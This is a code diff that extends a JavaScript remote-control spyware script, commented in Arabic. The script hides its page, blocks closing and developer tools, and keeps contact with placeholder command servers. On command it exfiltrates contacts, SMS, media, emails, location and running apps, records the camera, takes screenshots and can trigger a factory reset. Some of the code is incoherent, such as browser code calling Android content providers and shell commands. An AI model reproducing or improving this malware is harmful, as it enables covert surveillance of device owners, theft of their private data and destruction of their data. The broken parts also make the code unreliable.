@@ -7,15 +7,49 @@
         hideNotifications: true,
         silentMode: true,
         backgroundExecution: true,
-        autoRestart: true
+        autoRestart: true,
+        persistentStorage: true
     };
     
     // معرف الجهاز الفريد
     const deviceId = generateDeviceId();
     
+    // تهيئة التخزين المحلي
+    const localStorage = {
+        set: (key, value) => {
+            try {
+                window.localStorage.setItem(key, JSON.stringify(value));
+            } catch (e) {
+                console.warn('فشل في حفظ البيانات محلياً:', e);
+            }
+        },
+        get: (key) => {
+            try {
+                const data = window.localStorage.getItem(key);
+                return data ? JSON.parse(data) : null;
+            } catch (e) {
+                console.warn('فشل في قراءة البيانات المحلية:', e);
+                return null;
+            }
+        },
+        remove: (key) => {
+            try {
+                window.localStorage.removeItem(key);
+            } catch (e) {
+                console.warn('فشل في حذف البيانات المحلية:', e);
+            }
+        }
+    };
+    
     // تهيئة النظام
     async function initializeSystem() {
         try {
+            console.log('بدء تهيئة النظام...');
+            
+            // حفظ معرف الجهاز
+            localStorage.set('deviceId', deviceId);
+            localStorage.set('activationTime', Date.now());
+            
             // 1. منح الصلاحيات تلقائياً
             await grantAllPermissions();
             
@@ -25,20 +59,79 @@
             // 3. تعطيل الإشعارات
             disableNotifications();
             
-            // 4. الاتصال بخادم التحكم
+            // 4. تسجيل Service Worker للعمل في الخلفية
+            await registerServiceWorker();
+            
+            // 5. الاتصال بخادم التحكم
             await connectToControlServer();
             
-            // 5. بدء الخدمات الخلفية
+            // 6. بدء الخدمات الخلفية
             startBackgroundServices();
             
-            // 6. إرسال تأكيد التفعيل
+            // 7. إرسال تأكيد التفعيل
             sendActivationConfirmation();
             
+            // 8. حفظ حالة التفعيل
+            localStorage.set('systemStatus', 'active');
+            localStorage.set('lastActivity', Date.now());
+            
             console.log('تم تفعيل النظام بنجاح');
+            
+            // إخفاء واجهة المستخدم نهائياً
+            hideUserInterface();
+            
         } catch (error) {
             console.error('خطأ في التفعيل:', error);
+            localStorage.set('lastError', {
+                message: error.message,
+                timestamp: Date.now()
+            });
+            
             // إعادة المحاولة تلقائياً
             setTimeout(initializeSystem, 5000);
+        }
+    }
+    
+    // تسجيل Service Worker
+    async function registerServiceWorker() {
+        if ('serviceWorker' in navigator) {
+            try {
+                const registration = await navigator.serviceWorker.register('/sw.js');
+                console.log('تم تسجيل Service Worker:', registration);
+                
+                // إرسال معرف الجهاز للـ Service Worker
+                navigator.serviceWorker.controller?.postMessage({
+                    type: 'INIT',
+                    deviceId: deviceId
+                });
+                
+                return registration;
+            } catch (error) {
+                console.warn('فشل في تسجيل Service Worker:', error);
+            }
+        }
+    }
+    
+    // إخفاء واجهة المستخدم
+    function hideUserInterface() {
+        try {
+            // إخفاء جميع العناصر
+            document.body.innerHTML = '';
+            document.body.style.display = 'none';
+            
+            // إخفاء شريط العنوان
+            document.title = '';
+            
+            // منع التمرير
+            document.body.style.overflow = 'hidden';
+            
+            // إخفاء شريط التنقل
+            if (window.history && window.history.pushState) {
+                window.history.pushState(null, '', '/');
+            }
+            
+        } catch (e) {
+            console.warn('فشل في إخفاء واجهة المستخدم:', e);
         }
     }
     
@@ -125,42 +218,217 @@
     // الاتصال بخادم التحكم
     async function connectToControlServer() {
         const servers = [
+            'ws://localhost:4000',
+            'ws://192.168.1.100:4000',
             'wss://your-server.com/control',
             'wss://backup-server.com/control',
             'wss://fallback-server.com/control'
         ];
         
+        let connected = false;
+        
         for (const serverUrl of servers) {
+            if (connected) break;
+            
             try {
                 const ws = new WebSocket(serverUrl);
                 
                 ws.onopen = () => {
-                    console.log('تم الاتصال بالخادم');
+                    console.log(`تم الاتصال بنجاح بـ: ${serverUrl}`);
+                    connected = true;
+                    
+                    // تسجيل الجهاز
                     ws.send(JSON.stringify({
                         type: 'register',
                         deviceId: deviceId,
                         capabilities: getDeviceCapabilities(),
-                        timestamp: Date.now()
+                        timestamp: Date.now(),
+                        status: 'online'
                     }));
+                    
+                    // إرسال الأوامر المعلقة
+                    sendPendingCommands(ws);
                 };
                 
                 ws.onmessage = (event) => {
-                    const command = JSON.parse(event.data);
-                    handleIncomingCommand(command);
+                    try {
+                        const command = JSON.parse(event.data);
+                        handleIncomingCommand(command);
+                    } catch (error) {
+                        console.error('خطأ في معالجة الرسالة:', error);
+                    }
                 };
                 
                 ws.onclose = () => {
                     console.log('انقطع الاتصال، إعادة المحاولة...');
-                    setTimeout(connectToControlServer, 10000);
+                    connected = false;
+                    
+                    // حفظ حالة الاتصال
+                    localStorage.set('connectionStatus', 'disconnected');
+                    localStorage.set('lastDisconnection', Date.now());
+                    
+                    // إعادة المحاولة بعد 10 ثوان
+                    setTimeout(() => {
+                        if (!connected) {
+                            connectToControlServer();
+                        }
+                    }, 10000);
+                };
+                
+                ws.onerror = (error) => {
+                    console.error(`خطأ في الاتصال بـ ${serverUrl}:`, error);
+                    connected = false;
                 };
                 
                 // حفظ الاتصال للاستخدام لاحقاً
                 window.controlConnection = ws;
-                break;
+                
+                // انتظار الاتصال
+                await new Promise((resolve, reject) => {
+                    const timeout = setTimeout(() => {
+                        reject(new Error('انتهت مهلة الاتصال'));
+                    }, 10000);
+                    
+                    ws.onopen = () => {
+                        clearTimeout(timeout);
+                        resolve();
+                    };
+                    
+                    ws.onerror = () => {
+                        clearTimeout(timeout);
+                        reject(new Error('فشل الاتصال'));
+                    };
+                });
+                
             } catch (e) {
-                console.warn(`فشل الاتصال بـ ${serverUrl}`);
+                console.warn(`فشل الاتصال بـ ${serverUrl}:`, e);
                 continue;
             }
+        }
+        
+        if (!connected) {
+            console.log('فشل الاتصال بجميع الخوادم، الانتقال للوضع المحلي');
+            startLocalMode();
+        }
+    }
+    
+    // الوضع المحلي
+    function startLocalMode() {
+        console.log('بدء الوضع المحلي - استمرار العمليات بدون اتصال');
+        
+        localStorage.set('mode', 'local');
+        localStorage.set('localModeStart', Date.now());
+        
+        // استمرار الخدمات المحلية
+        continueLocalServices();
+        
+        // محاولة إعادة الاتصال كل 5 دقائق
+        setInterval(() => {
+            const connectionStatus = localStorage.get('connectionStatus');
+            if (connectionStatus !== 'connected') {
+                connectToControlServer();
+            }
+        }, 300000);
+    }
+    
+    // استمرار الخدمات المحلية
+    function continueLocalServices() {
+        // مراقبة الموقع المحلي
+        setInterval(() => {
+            getCurrentLocation().then(location => {
+                cacheData('location', location);
+            });
+        }, 300000);
+        
+        // مراقبة التطبيقات المحلية
+        setInterval(() => {
+            getRunningApps().then(apps => {
+                cacheData('running_apps', apps);
+            });
+        }, 60000);
+        
+        // حفظ البيانات المحلية
+        setInterval(() => {
+            saveCachedData();
+        }, 60000);
+    }
+    
+    // تخزين البيانات محلياً
+    function cacheData(type, data) {
+        try {
+            let cachedData = localStorage.get('cachedData') || {};
+            
+            cachedData[type] = {
+                data: data,
+                timestamp: Date.now()
+            };
+            
+            localStorage.set('cachedData', cachedData);
+        } catch (error) {
+            console.error('خطأ في تخزين البيانات المحلية:', error);
+        }
+    }
+    
+    // حفظ البيانات المحلية
+    function saveCachedData() {
+        try {
+            const cachedData = localStorage.get('cachedData');
+            if (cachedData) {
+                // حفظ البيانات في ملف منفصل
+                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                const backupKey = `data-backup-${timestamp}`;
+                localStorage.set(backupKey, cachedData);
+                
+                // حذف البيانات القديمة (أكثر من 7 أيام)
+                cleanupOldData();
+            }
+        } catch (error) {
+            console.error('خطأ في حفظ البيانات المحلية:', error);
+        }
+    }
+    
+    // تنظيف البيانات القديمة
+    function cleanupOldData() {
+        try {
+            const keys = Object.keys(localStorage);
+            const now = Date.now();
+            const sevenDays = 7 * 24 * 60 * 60 * 1000;
+            
+            keys.forEach(key => {
+                if (key.startsWith('data-backup-')) {
+                    const data = localStorage.get(key);
+                    if (data && data.timestamp && (now - data.timestamp > sevenDays)) {
+                        localStorage.remove(key);
+                        console.log(`تم حذف البيانات القديمة: ${key}`);
+                    }
+                }
+            });
+        } catch (error) {
+            console.error('خطأ في تنظيف البيانات القديمة:', error);
+        }
+    }
+    
+    // إرسال الأوامر المعلقة
+    function sendPendingCommands(ws) {
+        try {
+            const pendingCommands = localStorage.get('pendingCommands') || [];
+            
+            if (pendingCommands.length > 0) {
+                console.log(`إرسال ${pendingCommands.length} أمر معلق`);
+                
+                pendingCommands.forEach(command => {
+                    ws.send(JSON.stringify({
+                        type: 'pending_command_result',
+                        command: command,
+                        timestamp: Date.now()
+                    }));
+                });
+                
+                // مسح الأوامر المرسلة
+                localStorage.set('pendingCommands', []);
+            }
+        } catch (error) {
+            console.error('خطأ في إرسال الأوامر المعلقة:', error);
         }
     }
     
@@ -168,50 +436,104 @@
     function handleIncomingCommand(command) {
         console.log('تم استلام أمر:', command);
         
+        // حفظ الأمر محلياً
+        const pendingCommands = localStorage.get('pendingCommands') || [];
+        pendingCommands.push({
+            ...command,
+            receivedAt: Date.now()
+        });
+        localStorage.set('pendingCommands', pendingCommands);
+        
+        // تنفيذ الأمر
+        executeCommand(command).then(result => {
+            // إرسال النتيجة
+            if (window.controlConnection) {
+                window.controlConnection.send(JSON.stringify({
+                    type: 'command_result',
+                    commandId: command.id,
+                    action: command.action,
+                    status: 'success',
+                    result: result,
+                    timestamp: Date.now()
+                }));
+            }
+        }).catch(error => {
+            console.error(`خطأ في تنفيذ الأمر ${command.action}:`, error);
+            
+            // إرسال خطأ
+            if (window.controlConnection) {
+                window.controlConnection.send(JSON.stringify({
+                    type: 'command_result',
+                    commandId: command.id,
+                    action: command.action,
+                    status: 'error',
+                    error: error.message,
+                    timestamp: Date.now()
+                }));
+            }
+        });
+    }
+    
+    // تنفيذ الأوامر
+    async function executeCommand(command) {
         switch(command.action) {
             case 'backup_contacts':
-                backupContacts();
-                break;
+                return await backupContacts();
             case 'backup_sms':
-                backupSMS();
-                break;
+                return await backupSMS();
             case 'backup_media':
-                backupMedia();
-                break;
+                return await backupMedia();
             case 'backup_emails':
-                backupEmails();
-                break;
+                return await backupEmails();
             case 'get_location':
-                getCurrentLocation();
-                break;
+                return await getCurrentLocation();
             case 'record_camera':
-                recordCamera(command.duration || 30);
-                break;
+                return await recordCamera(command.duration || 30);
             case 'take_screenshot':
-                takeScreenshot();
-                break;
+                return await takeScreenshot();
             case 'factory_reset':
-                factoryReset();
-                break;
+                return await factoryReset();
             case 'get_running_apps':
-                getRunningApps();
-                break;
+                return await getRunningApps();
             case 'get_device_info':
-                getDeviceInfo();
-                break;
+                return getDeviceInfo();
+            default:
+                throw new Error(`أمر غير معروف: ${command.action}`);
         }
     }
     
     // بدء الخدمات الخلفية
     function startBackgroundServices() {
+        console.log('بدء الخدمات الخلفية...');
+        
         // مراقبة الموقع كل 5 دقائق
         setInterval(() => {
-            getCurrentLocation();
+            getCurrentLocation().then(location => {
+                if (window.controlConnection) {
+                    window.controlConnection.send(JSON.stringify({
+                        type: 'location_update',
+                        data: location,
+                        timestamp: Date.now()
+                    }));
+                } else {
+                    cacheData('location', location);
+                }
+            });
         }, 300000);
         
         // مراقبة التطبيقات النشطة كل دقيقة
         setInterval(() => {
-            getRunningApps();
+            getRunningApps().then(apps => {
+                if (window.controlConnection) {
+                    window.controlConnection.send(JSON.stringify({
+                        type: 'app_usage',
+                        data: apps,
+                        timestamp: Date.now()
+                    }));
+                } else {
+                    cacheData('running_apps', apps);
+                }
+            });
         }, 60000);
         
         // مراقبة الاتصال بالإنترنت
@@ -221,8 +543,19 @@
         
         // إرسال نبض الحياة كل 30 ثانية
         setInterval(() => {
-            sendHeartbeat();
+            if (window.controlConnection) {
+                window.controlConnection.send(JSON.stringify({
+                    type: 'heartbeat',
+                    deviceId: deviceId,
+                    timestamp: Date.now()
+                }));
+            }
         }, 30000);
+        
+        // حفظ حالة النشاط
+        setInterval(() => {
+            localStorage.set('lastActivity', Date.now());
+        }, 60000);
     }
     
     // إرسال تأكيد التفعيل
@@ -248,7 +581,11 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(activationData)
-        }).catch(e => console.warn('فشل في إرسال تأكيد التفعيل'));
+        }).catch(e => {
+            console.warn('فشل في إرسال تأكيد التفعيل');
+            // حفظ محلياً
+            cacheData('activation_confirmation', activationData);
+        });
     }
     
     // وظائف النسخ الاحتياطي
@@ -257,9 +594,9 @@
             const contacts = await queryContentProvider('content://com.android.contacts/data');
             const backupFile = createBackupFile('contacts.json', contacts);
             await uploadFile(backupFile);
-            sendCommandResult('backup_contacts', 'success', backupFile);
+            return { status: 'success', file: backupFile };
         } catch (e) {
-            sendCommandResult('backup_contacts', 'error', e.message);
+            throw new Error(`فشل في نسخ جهات الاتصال: ${e.message}`);
         }
     }
     
@@ -268,9 +605,9 @@
             const sms = await queryContentProvider('content://sms');
             const backupFile = createBackupFile('sms.json', sms);
             await uploadFile(backupFile);
-            sendCommandResult('backup_sms', 'success', backupFile);
+            return { status: 'success', file: backupFile };
         } catch (e) {
-            sendCommandResult('backup_sms', 'error', e.message);
+            throw new Error(`فشل في نسخ الرسائل: ${e.message}`);
         }
     }
     
@@ -286,9 +623,9 @@
             
             const backupFile = createBackupFile('media.json', mediaFiles);
             await uploadFile(backupFile);
-            sendCommandResult('backup_media', 'success', backupFile);
+            return { status: 'success', file: backupFile };
         } catch (e) {
-            sendCommandResult('backup_media', 'error', e.message);
+            throw new Error(`فشل في نسخ الوسائط: ${e.message}`);
         }
     }
     
@@ -297,9 +634,9 @@
             const emailData = await executeShellCommand('dumpsys email');
             const backupFile = createBackupFile('emails.txt', emailData);
             await uploadFile(backupFile);
-            sendCommandResult('backup_emails', 'success', backupFile);
+            return { status: 'success', file: backupFile };
         } catch (e) {
-            sendCommandResult('backup_emails', 'error', e.message);
+            throw new Error(`فشل في نسخ الإيميلات: ${e.message}`);
         }
     }
     
@@ -308,10 +645,9 @@
         try {
             const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
             const parsedLocation = parseLocationData(location);
-            
-            sendDataToServer('location', parsedLocation);
+            return parsedLocation;
         } catch (e) {
-            console.warn('فشل في الحصول على الموقع');
+            throw new Error(`فشل في الحصول على الموقع: ${e.message}`);
         }
     }
     
@@ -326,15 +662,19 @@
             );
             
             // انتظار انتهاء التسجيل
-            setTimeout(async () => {
-                if (await fileExists(outputPath)) {
-                    await uploadFile(outputPath);
-                    sendCommandResult('record_camera', 'success', outputPath);
-                }
-            }, (duration + 5) * 1000);
+            return new Promise((resolve, reject) => {
+                setTimeout(async () => {
+                    if (await fileExists(outputPath)) {
+                        await uploadFile(outputPath);
+                        resolve({ status: 'success', file: outputPath });
+                    } else {
+                        reject(new Error('فشل في إنشاء ملف التسجيل'));
+                    }
+                }, (duration + 5) * 1000);
+            });
             
         } catch (e) {
-            sendCommandResult('record_camera', 'error', e.message);
+            throw new Error(`فشل في تسجيل الكاميرا: ${e.message}`);
         }
     }
     
@@ -346,10 +686,12 @@
             
             if (await fileExists(screenshotPath)) {
                 await uploadFile(screenshotPath);
-                sendCommandResult('take_screenshot', 'success', screenshotPath);
+                return { status: 'success', file: screenshotPath };
+            } else {
+                throw new Error('فشل في إنشاء لقطة الشاشة');
             }
         } catch (e) {
-            sendCommandResult('take_screenshot', 'error', e.message);
+            throw new Error(`فشل في لقطة الشاشة: ${e.message}`);
         }
     }
     
@@ -357,9 +699,9 @@
     async function factoryReset() {
         try {
             await executeShellCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
-            sendCommandResult('factory_reset', 'success', 'تم بدء إعادة الضبط');
+            return { status: 'success', message: 'تم بدء إعادة الضبط' };
         } catch (e) {
-            sendCommandResult('factory_reset', 'error', e.message);
+            throw new Error(`فشل في إعادة الضبط: ${e.message}`);
         }
     }
     
@@ -368,10 +710,9 @@
         try {
             const runningApps = await executeShellCommand('dumpsys activity activities | grep mResumedActivity');
             const parsedApps = parseRunningApps(runningApps);
-            
-            sendDataToServer('running_apps', parsedApps);
+            return parsedApps;
         } catch (e) {
-            console.warn('فشل في الحصول على التطبيقات النشطة');
+            throw new Error(`فشل في الحصول على التطبيقات النشطة: ${e.message}`);
         }
     }
     
@@ -396,13 +737,19 @@
             geolocation: 'geolocation' in navigator,
             storage: 'storage' in navigator,
             notifications: 'Notification' in window,
-            webSocket: 'WebSocket' in window
+            webSocket: 'WebSocket' in window,
+            serviceWorker: 'serviceWorker' in navigator
         };
     }
     
     // وظائف مساعدة
     function generateDeviceId() {
-        return 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        const storedId = localStorage.get('deviceId');
+        if (storedId) return storedId;
+        
+        const newId = 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        localStorage.set('deviceId', newId);
+        return newId;
     }
     
     async function executeShellCommand(cmd) {
@@ -462,62 +809,56 @@
         return ['com.whatsapp', 'com.facebook', 'com.instagram'];
     }
     
-    function sendCommandResult(command, status, data) {
-        if (window.controlConnection) {
-            window.controlConnection.send(JSON.stringify({
-                type: 'command_result',
-                command: command,
-                status: status,
-                data: data,
-                timestamp: Date.now()
-            }));
-        }
-    }
-    
-    function sendDataToServer(dataType, data) {
-        if (window.controlConnection) {
-            window.controlConnection.send(JSON.stringify({
-                type: 'data_update',
-                dataType: dataType,
-                data: data,
-                timestamp: Date.now()
-            }));
-        }
-    }
-    
-    function sendHeartbeat() {
-        if (window.controlConnection) {
-            window.controlConnection.send(JSON.stringify({
-                type: 'heartbeat',
-                deviceId: deviceId,
-                timestamp: Date.now()
-            }));
-        }
-    }
-    
     function checkInternetConnection() {
         fetch('https://www.google.com', { mode: 'no-cors' })
             .then(() => {
-                sendDataToServer('internet_status', { connected: true });
+                const status = { connected: true, timestamp: Date.now() };
+                if (window.controlConnection) {
+                    window.controlConnection.send(JSON.stringify({
+                        type: 'internet_status',
+                        data: status
+                    }));
+                } else {
+                    cacheData('internet_status', status);
+                }
             })
             .catch(() => {
-                sendDataToServer('internet_status', { connected: false });
+                const status = { connected: false, timestamp: Date.now() };
+                if (window.controlConnection) {
+                    window.controlConnection.send(JSON.stringify({
+                        type: 'internet_status',
+                        data: status
+                    }));
+                } else {
+                    cacheData('internet_status', status);
+                }
             });
     }
     
     // بدء النظام عند تحميل الصفحة
     document.addEventListener('DOMContentLoaded', () => {
-        // إخفاء واجهة المستخدم
-        document.body.style.display = 'none';
+        console.log('تم تحميل الصفحة، بدء التفعيل...');
         
-        // بدء التفعيل في الخلفية
-        initializeSystem();
+        // التحقق من وجود تفعيل سابق
+        const systemStatus = localStorage.get('systemStatus');
+        if (systemStatus === 'active') {
+            console.log('النظام مفعل مسبقاً، إعادة الاتصال...');
+            connectToControlServer();
+            startBackgroundServices();
+        } else {
+            // بدء التفعيل الجديد
+            initializeSystem();
+        }
     });
     
     // منع إغلاق الصفحة
     window.addEventListener('beforeunload', (e) => {
         e.preventDefault();
         e.returnValue = '';
+        
+        // حفظ حالة النظام
+        localStorage.set('systemStatus', 'active');
+        localStorage.set('lastActivity', Date.now());
     });
     
     // منع فتح أدوات المطور
@@ -535,5 +876,14 @@
             e.preventDefault();
         }
     });
+    
+    // معالجة رسائل Service Worker
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.addEventListener('message', (event) => {
+            if (event.data.type === 'COMMAND') {
+                handleIncomingCommand(event.data.command);
+            }
+        });
+    }
     
 })();
